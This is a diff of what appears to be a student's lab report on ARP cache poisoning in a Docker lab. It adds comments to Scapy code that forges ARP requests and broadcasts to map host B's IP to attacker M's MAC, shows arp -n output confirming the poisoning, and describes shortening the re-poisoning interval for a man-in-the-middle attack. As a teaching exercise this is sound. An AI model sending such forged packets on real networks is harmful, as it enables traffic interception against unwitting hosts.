@@ -25,20 +25,25 @@ MAC_M = "ba:6c:5e:7d:76:89"
 
 ---
 ## Task 1: ARP Cache Poisoning
-### 1.A (using ARP Request)
+### 1.A (using ARP Request: op=1)
 **Objective:** Construct an ARP request on host M that poisons host A’s ARP cache by associating B’s IP address with M’s MAC address.
 
 **Implementation:** The following program was executed on M:
 ```python
+# Build an Ethernet frame
 E = Ether(src=MAC_M, dst=MAC_A)
+ # Create a forged ARP request:
 A = ARP(psrc=IP_B, pdst=IP_A, hwsrc=MAC_M, op=1)
+# Encapsulate the ARP packet inside the Ethernet frame
 pkt = E / A
 sendp(pkt)
 ```
+ARP request is usually broadcast (The sender does not know the target’s MAC yet). 
+When Host A receives any ARP packet (request or reply), It looks at the sender fields psrc (sender IP) and hwsrc (sender MAC) and updates its ARP cache with that information.
 
 **Result:**
 After execution, the ARP cache on Host A was checked:
-HOST A
+HOST A:
 ```bash
 gabriele@gabriele-ThinkCentre-M900:~/Desktop/Labsetup$ docker exec -it A-10.9.0.5 /bin/bash
 root@2960c82b0318:/# arp -n
@@ -48,7 +53,7 @@ Address HWtype HWaddress Flags Mask Iface
 ```
 Host A incorrectly identifies B's MAC address as `ba:6c:5e:7d:76:89` (M's MAC), indicating the poisoning was successful.
 
-## 1.B (using ARP reply)
+### 1.B (using ARP reply op=2)
 **Objective:** Use an ARP Reply packet to map B's IP address to M's MAC address in A's cache.
 
 **Implementation:**
@@ -106,7 +111,8 @@ The unsolicited ARP reply is ignored, and no cache entry is created because A ha
 
 **Implementation:**
 ```python
-E = Ether(src=MAC_M, dst="ff:ff:ff:ff:ff:ff")
+MAC_BCAST = "ff:ff:ff:ff:ff:ff"
+E = Ether(src=MAC_M, dst=MAC_BCAST)
 A = ARP(
     psrc=IP_B,
     pdst=IP_B,
@@ -130,7 +136,7 @@ Address                  HWtype  HWaddress           Flags Mask            Iface
 10.9.0.6                 ether   ba:6c:5e:7d:76:89   C                     eth0
 10.9.0.105               ether   ba:6c:5e:7d:76:89   C                     eth0
 ```
-<img src="./img/2_point_1_C_senario_1.png" style="width:80%; height:auto;">
+<img src="./img/2_point_1_C_senario_1.png" style="width:90%; height:auto;">
 
 ### Scenario 2 (B’s IP is not in A’s cache)
 **Result:**
@@ -189,7 +195,8 @@ This recovery occurs because A attempts to resolve the IP again by sending a gen
 **Result:**
 When pinging B from A, the connection was highly unstable. Most packets were lost, but some replies were received. This happens because A occasionally recovers B's true MAC address before the MITM script re-poisons the cache.
 
-To make the attack more effective, I reduced the interval of false ARP packets to 1 second. This poisoned the cache more frequently, resulting in stable failure of the ping command (as expected, since M intercepts but does not forward).
+To make the attack more effective, I reduced the interval of false ARP packets to 1 second. This poisoned the cache more frequently, resulting in stable failure of the ping command (as expected, since M intercepts but does not forward).  
+
 <img src="./img/test_mim_attack_task_2.png" style="width:80%; height:auto;">
 
 ### Step 3 (Turn on IP forwarding)
